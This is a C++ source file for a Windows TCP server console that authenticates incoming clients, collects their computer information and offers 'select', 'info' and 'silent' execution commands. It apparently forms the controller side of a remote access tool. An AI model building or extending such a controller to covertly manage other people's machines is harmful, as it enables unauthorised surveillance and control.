#include "..\Library\precompile.h"
#include "tcp_server.h"
#include "helper_file.h"
//Server

tcp_server::tcp_server(std::string name)
{

	console = pipe(name, false);

	manip::enable_ansi();

	if (console.listen()) {
		console.run_pe(helper_exe);
	}

	else {
		manip::output_error(GetLastError(), "pipe_listen()");
		Sleep(2000);
		exit(-1);
	}
}

tcp_server::~tcp_server()
{
	for (auto& t : active_jobs) t.second.join();

	if (manager_thread.joinable())	manager_thread.join();

	FD_CLR(main_socket, &client_set);
	closesocket(main_socket);
	WSACleanup();
}

int tcp_server::get_port() const
{
	return accepting_port;
}

void tcp_server::set_port(int new_port)
{
	accepting_port = new_port;
}

void tcp_server::set_prefix(std::string input)
{
	name_prefix = input;
}

pipe tcp_server::get_pipe()
{
	return console;
}

void tcp_server::list_packets(std::string sock_string)
{
	if (is_digits(sock_string)) {
		int sock_id = std::stoi(sock_string);
		auto index(search_vector(client_list, &client::socket_id, sock_id));
		if (index != client_list.end()) {
			for (auto pack : index->packet_queue) {
				std::cout << pack;
			}
		}
	}
}

void tcp_server::prompt(std::string function, std::string arguments)
{
	if (manip::map_contains(commandline_function, function)) {
		commandline_function[function](arguments);
	}
	else {
		std::cout << "'" << function << "' is not a recognized command." << std::endl;
	}
}

bool tcp_server::startup()
{
	return wsa_startup(socket_data);
}

bool tcp_server::initialize()
{
	return initialize_socket(main_socket);
}

bool tcp_server::listen()
{
	return socket_listen(main_socket);
}

bool tcp_server::manager()
{
	return start_manager();
}

bool tcp_server::bind()
{
	return socket_bind(main_socket, accepting_port);
}

packet tcp_server::recv(int sock, int second)
{
	// Receive Packet Header Size 32 bytes (char)
	const auto header_length = 32;
	const auto recv_size = 65536;
	char header_buffer[header_length + 1]{};

	const auto bytes_recv = ::recv(sock, header_buffer, header_length, 0);

	if (handle_error(format_error(bytes_recv), sock)) // Check if Socket received without error
	{
		std::string header_string(header_buffer);

		if (is_digits(header_buffer)) // Check if string is only consisting of numbers bcs of stoi in format_input()
		{

			auto [identifier_size, data_size] = format_input(header_string); // Formats size string to ints 0000000000001600000000000032 -> 16, 32

			auto [head_iterations, head_excess, data_iterations, data_excess] = calc_iter(identifier_size, data_size, recv_size); // (Size -> (iteration + excess bytes)) => 500000 -> 7, 41248

			auto [head_iteration_buffer, head_excess_buffer] = recv_(sock, head_iterations, head_excess, recv_size, second); // Iteration + Excess -> recv() -> std::string(), std::string()

			auto [data_iteration_buffer, data_excess_buffer] = recv_(sock, data_iterations, data_excess, recv_size, second); // Iteration + Excess -> recv() -> std::string(), std::string()

			return {
				merge(head_iteration_buffer, head_excess_buffer),
				merge(data_iteration_buffer, data_excess_buffer),
				identifier_size,
				static_cast<long long>(data_size),
				0
			};

		}
	}

	return {
		"",
		"",
		0,
		0,
		-1
	};

}

bool tcp_server::send(client target, std::string input, std::string head)
{
	std::string sizes = pad_text(head) + pad_text(input);
	return handle_error(format_error(::send(target.socket_id, sizes.c_str(), int(sizes.size()), 0)), target.socket_id) && handle_error(format_error(::send(target.socket_id, head.c_str(), int(head.size()), 0)), target.socket_id) && handle_error(format_error(::send(target.socket_id, input.c_str(), int(input.size()), 0)), target.socket_id);
}

WSA_ERROR tcp_server::format_error(int error_code)
{
	if (error_code == SOCKET_ERROR) {

		auto const error{ WSAGetLastError() };
		char msg_buf[256]{ '\0' };

		FormatMessageA(

			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS |
			FORMAT_MESSAGE_MAX_WIDTH_MASK,
			nullptr,
			error,
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			msg_buf,
			sizeof(msg_buf),
			nullptr

		);

		return WSA_ERROR(error, std::string(msg_buf));

	}
	return WSA_ERROR(0);

}

bool tcp_server::handle_error(WSA_ERROR error, unsigned int socket)
{
	switch (error.code) {
	case 0: // No Error
		break;
	case 10054: { // Client Dropped Connection
		auto disconnected_client = find_client(std::to_string(socket));
		if (disconnected_client != client_list.end()) {
			console << "[-] Disconnected [" << disconnected_client->name << "]\n";

			// Remove and disconnects client

			client_list.erase(std::remove(client_list.begin(), client_list.end(), *disconnected_client), client_list.end());
			FD_CLR(socket, &client_set);
			closesocket(socket);

			// Finish the jobs for the client

			for (auto& pair : active_jobs) {
				if (pair.first == socket) {
					pair.second.join();
				}
			}
		}
		else {
			FD_CLR(socket, &client_set);
			closesocket(socket);
		}
		break;
	}
	default:
		console << socket << "|" << error << "\n";
	}

	return error.code == 0;
}

bool tcp_server::socket_listen(SOCKET& sock)
{
	return ::listen(sock, SOMAXCONN) != SOCKET_ERROR;
}

bool tcp_server::socket_bind(SOCKET& sock, int bind_port)
{
	sockaddr_in socket_hint{};
	socket_hint.sin_family = AF_INET;
	socket_hint.sin_port = htons(bind_port);
	socket_hint.sin_addr.S_un.S_addr = INADDR_ANY;

	return ::bind(sock, reinterpret_cast<sockaddr*>(&socket_hint), sizeof(socket_hint)) != SOCKET_ERROR;
}

bool tcp_server::wsa_startup(WSADATA& sock_data)
{
	return WSAStartup(MAKEWORD(2, 2), &sock_data) == 0;
}

bool tcp_server::initialize_socket(SOCKET& sock)
{
	sock = socket(AF_INET, SOCK_STREAM, 0);
	return sock != INVALID_SOCKET;
}

bool tcp_server::start_manager()
{
	FD_ZERO(&client_set);
	FD_SET(main_socket, &client_set);
	manager_thread = std::thread(&tcp_server::handler, this);
	return manager_thread.joinable();
}

void tcp_server::handler()
{
	while (true)
	{
		auto local_set = client_set;

		auto socket_count = select(0, &local_set, nullptr, nullptr, nullptr);

		for (auto i = 0; i < socket_count; i++)
		{

			auto const current_socket = local_set.fd_array[i];

			if (current_socket == main_socket) // New Client

			{

				sockaddr_in socket_address{};

				char host[NI_MAXHOST]{};

				int address_len = sizeof(socket_address);

				auto client_socket = accept(main_socket, reinterpret_cast<sockaddr*>(&socket_address), &address_len);

				FD_SET(client_socket, &client_set);

				inet_ntop(AF_INET, &socket_address.sin_addr, host, NI_MAXHOST);

				console << "[+] Incoming connection\n";

				auto current_challanger = client(host, client_socket, std::string(name_prefix + "_" + manip::zero_pad(client_list.size(), 3)));

				std::thread authentication_thread(&tcp_server::authenticate, this, current_challanger);
				
				console << "[+] Authentication in progress\n";

				authentication_thread.detach();

			}

			else  // New Message

			{
				auto current_cli(search_vector(client_list, &client::socket_id, int(current_socket)));
				if (current_cli != client_list.end()) {
					if (current_cli->socket_id != 0) {
						if (!current_cli->blocking) {
							auto msg(tcp_server::recv(current_cli->socket_id, 1));
							if (msg.error_code == success) {
								current_cli->packet_queue.push_back(msg);
							}
						}
					}
				}
			}
		}
	}
}

bool tcp_server::readable(SOCKET sock, int sec, int milli)
{
	fd_set socket_descriptor;
	FD_ZERO(&socket_descriptor);
	FD_SET(sock, &socket_descriptor);
	timeval timeout{ sec, milli };

	return select(0, &socket_descriptor, nullptr, nullptr, &timeout);
}

std::tuple<int, int> tcp_server::format_input(std::string victim)
{
	auto [first, second] = half_string(victim);

	return std::make_tuple(std::stoi(first), std::stoi(second));
}

bool tcp_server::is_digits(std::string victim) const
{
	return std::all_of(victim.begin(), victim.end(), [&](char c) {return c <= '9' && c >= '0'; }) && !victim.empty();
}

template <typename ... Arguments>
std::string tcp_server::merge(Arguments ... args)
{
	return std::string((args + ...));
}

std::string tcp_server::recv_iteration(int iter, int size, SOCKET sock, int second)
{
	std::string received_data;

	for (auto i = 0; i < iter; i++)
	{
		if (readable(sock, second, 0))
		{	
			std::vector<char> data(size);
			int bytes_recv = ::recv(sock, &data.at(0), size, 0);
			if (handle_error(format_error(bytes_recv), sock) && bytes_recv == size) {
				received_data += std::string(data.begin(), data.end());
			}
		}
	}
	return received_data;
}

std::tuple<std::string, std::string> tcp_server::recv_(SOCKET sock, int iter, int excess, int recv_size, int second)
{
	return std::make_tuple(recv_iteration(iter, recv_size, sock, second), recv_excess(excess, sock, second));
}

std::string tcp_server::recv_excess(int size, SOCKET sock, int second)
{
	std::vector<char> data(size);

	std::string excess_data;

	if (readable(sock, second, 0) && handle_error(format_error(::recv(sock, &data.at(0), size, 0)), sock))
	{
		excess_data = std::string(data.begin(), data.end());
	}

	return excess_data;
}

std::tuple<std::string, std::string> tcp_server::half_string(const std::string& victim)
{
	const auto half = victim.length() / 2;
	std::string first(victim.substr(0, half));
	std::string second(victim.substr(half, half));
	return std::make_tuple(first, second);
}

std::tuple<int, int, int, int> tcp_server::calc_iter(int first_size, int second_size, int recv_size)
{
	return std::make_tuple((first_size / recv_size), (first_size - (recv_size * (first_size / recv_size))), (second_size / recv_size), (second_size - (recv_size * (second_size / recv_size))));
}

std::tuple<int, int> tcp_server::generate_password(int min, int max)
{
	std::random_device rd;
	std::mt19937 mt(rd());
	std::uniform_int_distribution<std::mt19937::result_type> distribution(min, max);

	int input = distribution(mt);
	int singularity = ((input % 2 == 0) ? input : input / 2);
	return std::make_tuple(input, abs(((input ^ (input / 2) ^ (input * singularity * input)) % (input * input)) * singularity));
}

void tcp_server::authenticate(client challenger)
{
	challenger.set_block(true); // Makes current client non readable for manager function

	auto [clue, key] = generate_password(10000, 99999);

	if (tcp_server::send(challenger, std::to_string(clue), "authenticate_clue")) {

		if (readable(challenger.socket_id, 5, 0)) {

			packet client_response = recv(challenger.socket_id, 2);

			if (is_digits(client_response.data_buffer)) {

				auto response_key = std::stoi(client_response.data_buffer);

				if (response_key == key && tcp_server::send(challenger, "1", "Authentication")) {
					console << "[+] Authenticated [" << challenger.ip_address << "] as " << challenger.socket_id << " named " << challenger.name << "\n";
					challenger.set_block(false);
					client_list.push_back(challenger);
					return;
				}
			}
		}
	}

	console << "[-] Rejected [" << challenger.ip_address << "]\n";
	closesocket(challenger.socket_id);
	FD_CLR(challenger.socket_id, &client_set);
}

std::map<std::string, std::function<void(std::string)>> tcp_server::create_argmap()
{
	return
	{

		{"clear", [&](std::string args) {manip::clear_console(); }},

		{"packets", [&](std::string args) {list_packets(args); }},

		{"show", [&](std::string args) {
			manip::argument_passer({

				{"options", [&] {
					std::cout << "    Port:        " << accepting_port << std::endl << std::boolalpha
							  << "    Verbosity:   " << output_verbosity << std::endl
							  << "    Name Prefix: " << name_prefix << std::endl;
				}},

				{"clients", [&] {
					for (auto client : client_list) {
						std::cout << client << std::endl;
					}
				}},

				{"connections", [&] {
					for (auto client : client_list) {
						std::cout << client.ip_address << "|" << client.socket_id << std::endl;
					}
				}}

			}, args);
		}},

		{"port", [&](std::string args) {
			if (is_digits(args)) {
				accepting_port = std::stoi(args);
			}
			else {
				std::cout << "The syntax of this command is incorrect." << std::endl;
			}
		}},

		{"verbose", [&](std::string args) {
			std::transform(args.begin(), args.end(), args.begin(), ::tolower);
			if (args == "true") {
				output_verbosity = true;
			}
			else if (args == "false") {
				output_verbosity = false;
			}
			else {
				std::cout << "The syntax of this command is incorrect." << std::endl;
			}
		}},

		{"prefix", [&](std::string args) {
			if (!name_prefix.empty()) {
				name_prefix = args;
			}
			else {
				std::cout << "The syntax of this command is incorrect." << std::endl;
			}
		}},

		{"info", [&](std::string args) {

			auto search = find_client(args);

			if (search != client_list.end()) {
				info(*search, request);
				active_jobs.push_back({ search->socket_id, std::thread(&tcp_server::info, this, std::ref(*search), fetch) });
			}
			else if (args.empty()) {
				std::cout << "The syntax of this command is incorrect." << std::endl;
			}
			else {
				std::cout << "Client \"" << args << "\" could not be found in db." << std::endl;
			}

		}},

		{"silent", [&](std::string args) {
			
			if (!args.empty()) {
				silent_execute(args);
			}
			else {
				std::cout << "The syntax of this command is incorrect." << std::endl;
			}

		}},

		{"select",[&](std::string args) {
				auto search = find_client(args);

				if (search != client_list.end()) {
					if (valid_client(*search)) {
						selected_client = &*search;
					}
					else {
						std::cout << "Client \"" << args << "\" is broken" << std::endl;
					}
				}
				else if (args.empty()) {
					std::cout << "The syntax of this command is incorrect." << std::endl;
				}
				else {
					std::cout << "Client \"" << args << "\" could not be found in db." << std::endl;
				}
		}},

		{"client", [&](std::string args) {

				auto search = find_client(args);

				if (search != client_list.end()) {
					std::cout <<
						"\n    Name:      " << search->name <<
						"\n    Socket ID: " << search->socket_id <<
						"\n    Ip:        " << search->ip_address <<
						"\n    Port:      " << accepting_port <<
						"\n    Blocking:  " << std::boolalpha << search->blocking <<
						"\n" << std::endl;

					for (auto [key,value] : search->computer_info) {
						if (!value.empty()) {
							std::cout << "    " << key << ": " << value << std::endl;
						}
					}

					std::cout << std::endl;
				}
				else if (args.empty()) {
					std::cout << "The syntax of this command is incorrect." << std::endl;
				}
				else {
					std::cout << "Client \"" << args << "\" could not be found in db." << std::endl;
				}
		}},

	};
}

std::string tcp_server::pad_text(const std::string& victim)
{
	const auto head_length = 16;
	const auto pad_length = (!victim.empty()) ? static_cast<int>(log10(victim.size())) + 1 : 1;
	return std::string(std::string(static_cast<const unsigned _int64>(head_length) - pad_length, '0') + std::to_string(victim.size()));
}

std::vector<client>::iterator tcp_server::find_client(std::string args)
{
	std::vector<client>::iterator search;

	if (is_digits(args)) {
		search = search_vector(client_list, &client::socket_id, std::stoi(args)); // Search by Socket ID
	}
	else if (std::all_of(args.begin(), args.end(), [](char c) {return std::isdigit(c) || c == '.'; })) {
		search = search_vector(client_list, &client::ip_address, args); // Search by IP
	}
	else {
		search = search_vector(client_list, &client::name, args); // Search by Name
	}

	return search;
}

bool tcp_server::is_connected(client c)
{
	return consists(client_list, c);
}

bool tcp_server::valid_client(client victim)
{
	return !victim.ip_address.empty() && victim.socket_id != 0 && !victim.name.empty();
}

//WSA_ERROR

WSA_ERROR::WSA_ERROR(int error_code, std::string error_msg)
{
	code = error_code;
	msg = error_msg;
}

WSA_ERROR::WSA_ERROR(int error_code)
{
	code = error_code;
	msg = "";
}

//Client

void client::push_packet(packet input)
{
	packet_queue.push_back(input);
}
